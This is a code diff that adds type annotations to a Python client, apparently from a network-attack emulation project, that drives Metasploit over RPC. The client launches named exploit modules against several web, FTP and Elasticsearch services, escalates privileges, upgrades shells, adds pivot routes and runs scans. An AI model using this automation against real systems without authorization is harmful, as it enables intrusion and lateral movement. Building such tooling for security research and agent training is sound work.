@@ -1,13 +1,20 @@
 # This is an interface to pymetasploit3, with the currently supported modules as methods and some helper functions.
 # By default, the msfrcpd password is 'msfpassword'.
 
+from typing import Any
 from nasimemu.pymetasploit3.msfrpc import MsfRpcClient
 import time, re
 import logging
 from pprint import pprint
 
+
+def _group1(match: "re.Match[str] | None") -> str:
+    assert match is not None
+    return match.group(1)
+
+
 class MsfClient():
-    def __init__(self, password, lhost, host='127.0.0.1', port=55553):
+    def __init__(self, password: str, lhost: str, host: str = '127.0.0.1', port: int = 55553) -> None:
         self.logger = logging.getLogger("MsfClient")
         self.logger.info(f"Connecting to msfrpcd at {host}:{port}")
         self.client = MsfRpcClient(password, host=host, port=port, ssl=True)
@@ -16,13 +23,13 @@ class MsfClient():
         # create a new console, use only one
         self.console = self.client.consoles.console()
 
-    def get_sessions(self):
+    def get_sessions(self) -> Any:
         return self.client.sessions.list
 
     # warning: user filtering not working as expected
     # sometimes the user field is populated incorrectly, especially after successful priviledge escalation
     # session_type: shell / meterpreter
-    def get_sessions_filtered(self, ip=None, user=None, session_type=None):
+    def get_sessions_filtered(self, ip: str | None = None, user: str | None = None, session_type: str | None = None) -> Any:
         sessions = self.get_sessions()
 
         if ip is not None:
@@ -36,7 +43,7 @@ class MsfClient():
 
         return sessions
 
-    def run_shell_command(self, session_id, cmd, os="linux"):
+    def run_shell_command(self, session_id: Any, cmd: str, os: str = "linux") -> str:
         session = self.get_sessions()[str(session_id)]
         self.logger.info(f"Running `{cmd}` at #{session_id} ({session['session_host']})")
 
@@ -55,7 +62,7 @@ class MsfClient():
                 module_params={'COMMAND': command_string, 'SESSION': int(session_id)}
         )
 
-        def find_between(s, first, last):
+        def find_between(s: str, first: str, last: str) -> str:
             try:
                 start = s.index(first) + len(first)
                 end = s.index(last, start)
@@ -68,7 +75,7 @@ class MsfClient():
 
         return result
 
-    def wait_for_job(self, job_id, timeout=0):
+    def wait_for_job(self, job_id: Any, timeout: int = 0) -> bool:
         seconds_elapsed = 0
 
         while True:
@@ -84,18 +91,18 @@ class MsfClient():
             time.sleep(1)
             seconds_elapsed += 1
 
-    def get_session_id(self, result, rhost):
-        result = [line for line in result.split('\n') if '[*] Session ' in line]
+    def get_session_id(self, result: str, rhost: str) -> str | None:
+        lines = [line for line in result.split('\n') if '[*] Session ' in line]
 
-        if len(result) == 0:
+        if len(lines) == 0:
             self.logger.info("No session created.")
             return None
 
-        session_id = re.match(r".* Session (\d+) created .*", result[0]).group(1)
+        session_id = _group1(re.match(r".* Session (\d+) created .*", lines[0]))
         self.logger.info(f"Opened new session #{session_id} for {rhost}")
         return session_id
 
-    def run_module(self, module_type, module_name, module_params, payload_name=None, payload_params=None, forced_params=None, run_with_console=True, verbose=False):
+    def run_module(self, module_type: str, module_name: str, module_params: dict[str, Any], payload_name: str | None = None, payload_params: dict[str, Any] | None = None, forced_params: dict[str, Any] | None = None, run_with_console: bool = True, verbose: bool = False) -> Any:
         self.logger.info(f"Executing {module_type}:{module_name} with params {module_params}")
 
         module = self.client.modules.use(module_type, module_name)
@@ -112,6 +119,7 @@ class MsfClient():
 
         if payload_name is not None:
             payload = self.client.modules.use('payload', payload_name)
+            assert payload_params is not None
             for pkey, pval in payload_params.items():
                 if pkey == 'encoder':
                     payload.runoptions[pkey] = pval
@@ -138,7 +146,7 @@ class MsfClient():
 
             return None
 
-    def run_msf_command(self, cmd):
+    def run_msf_command(self, cmd: str) -> str:
         self.logger.info(f"Executing msfconsole command: `{cmd}`")
 
         console = self.console
@@ -159,11 +167,11 @@ class MsfClient():
         return output
 
     # create a route to the subnet via session_id (must be meterpreter)
-    def add_route(self, ip, mask, session_id):
+    def add_route(self, ip: str, mask: Any, session_id: Any) -> None:
         cmd = f'route add {ip}/{mask} {session_id}'
         self.run_msf_command(cmd)
 
-    def exploit_drupal_coder_exec(self, rhost):
+    def exploit_drupal_coder_exec(self, rhost: str) -> str | None:
         result = self.run_module(
                         module_type = 'exploit',
                         module_name = 'unix/webapp/drupal_coder_exec',
@@ -174,7 +182,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def exploit_proftpd_modcopy_exec(self, rhost):
+    def exploit_proftpd_modcopy_exec(self, rhost: str) -> str | None:
         result = self.run_module(
                         module_type = 'exploit',
                         module_name = 'unix/ftp/proftpd_modcopy_exec',
@@ -185,7 +193,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def exploit_wp_ninja_forms_unauthenticated_file_upload(self, rhost):
+    def exploit_wp_ninja_forms_unauthenticated_file_upload(self, rhost: str) -> str | None:
         result = self.run_module(
                 module_type = 'exploit',
                 module_name = 'multi/http/wp_ninja_forms_unauthenticated_file_upload',
@@ -207,7 +215,7 @@ class MsfClient():
         return self.get_session_id(result, rhost)
 
 
-    def exploit_elasticsearch_script_mvel_rce(self, rhost):
+    def exploit_elasticsearch_script_mvel_rce(self, rhost: str) -> str | None:
         result = self.run_module(
                 module_type = 'exploit',
                 module_name = 'multi/elasticsearch/script_mvel_rce',
@@ -219,7 +227,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def exploit_phpwiki_ploticus_exec(self, rhost):
+    def exploit_phpwiki_ploticus_exec(self, rhost: str) -> str | None:
         result = self.run_module(
                         module_type = 'exploit',
                         module_name = 'multi/http/phpwiki_ploticus_exec',
@@ -230,7 +238,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def privesc_overlayfs_priv_esc(self, rhost, session_id):
+    def privesc_overlayfs_priv_esc(self, rhost: str, session_id: Any) -> str | None:
         result = self.run_module(
                         module_type = 'exploit',
                         module_name = 'linux/local/overlayfs_priv_esc',
@@ -241,7 +249,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def post_shell_to_meterpreter(self, session_id):
+    def post_shell_to_meterpreter(self, session_id: Any) -> str | None:
         self.run_module(
                         module_type = 'post',
                         module_name = 'multi/manage/shell_to_meterpreter',
@@ -262,7 +270,7 @@ class MsfClient():
 
         return self.get_session_id(result, rhost)
 
-    def scan_portscan(self, rhosts, ports, threads=10):
+    def scan_portscan(self, rhosts: str, ports: str, threads: int = 10) -> list[str]:
         result = self.run_module(
                         module_type = 'auxiliary',
                         module_name = 'scanner/portscan/tcp',
@@ -270,13 +278,13 @@ class MsfClient():
                 )
 
         result = [line for line in result.split('\n') if 'TCP OPEN' in line]
-        result = [re.match(r".*- ([\.\d:]+) - .*", x).group(1) for x in result]
+        result = [_group1(re.match(r".*- ([\.\d:]+) - .*", x)) for x in result]
 
         self.logger.info(f"Scan result: {result}")
 
         return result
 
-    def scan_dir_scanner(self, rhosts, port, threads=1):
+    def scan_dir_scanner(self, rhosts: str, port: str, threads: int = 1) -> list[str]:
         result = self.run_module(
                 module_type = 'auxiliary',
                 module_name = 'scanner/http/dir_scanner',
@@ -285,12 +293,12 @@ class MsfClient():
         )
         result = [line for line in result.split('\n') if '[+] Found' in line and ' 200 ' in line]
         print(result)
-        result = [re.match(r".*https?://.+/(.+)/ [0-9]+ .*", x).group(1) for x in result]
+        result = [_group1(re.match(r".*https?://.+/(.+)/ [0-9]+ .*", x)) for x in result]
 
         self.logger.info(f"Folders found on the Http service: {result}")
         return result
 
-    def scan_ping_sweep(self, rhosts, session_id):
+    def scan_ping_sweep(self, rhosts: str, session_id: Any) -> list[str]:
         result = self.run_module(
                         module_type = 'post',
                         module_name = 'multi/gather/ping_sweep',
@@ -298,12 +306,12 @@ class MsfClient():
                 )
 
         result = [line for line in result.split('\n') if 'host found' in line]
-        result = [re.match(r".*\t([\.\d]+) .*", x).group(1) for x in result]
+        result = [_group1(re.match(r".*\t([\.\d]+) .*", x)) for x in result]
 
         self.logger.info(f"Scan result: {result}")
         return result
 
-    def scan_os_smb(self, rhost):
+    def scan_os_smb(self, rhost: str) -> list[str | None]:
         result = self.run_module(
                         module_type = 'auxiliary',
                         module_name = 'scanner/smb/smb_version',
@@ -334,7 +342,7 @@ class MsfClient():
     #       self.logger.info(f"Scan result: {nresult}")
     #       return nresult
 
-    def get_os_by_cmd(self, session_id):
+    def get_os_by_cmd(self, session_id: Any) -> str | None:
         if "Linux" in self.run_shell_command(session_id, "uname"):
             return "linux"
 
@@ -347,13 +355,13 @@ class MsfClient():
         self.logger.warning(f"Os detection failed for session {session_id}")
         return None
 
-    def is_session_meterpreter(self, session_id):
+    def is_session_meterpreter(self, session_id: Any) -> bool:
         sessions = self.get_sessions()
         if session_id not in sessions:
             self.logger.warning(f"Impossible to check session type, session {session_id} not found")
             return False
 
-        return sessions[session_id]["type"] == 'meterpreter'
+        return bool(sessions[session_id]["type"] == 'meterpreter')
 
 if __name__ == '__main__':
     # useful for testing
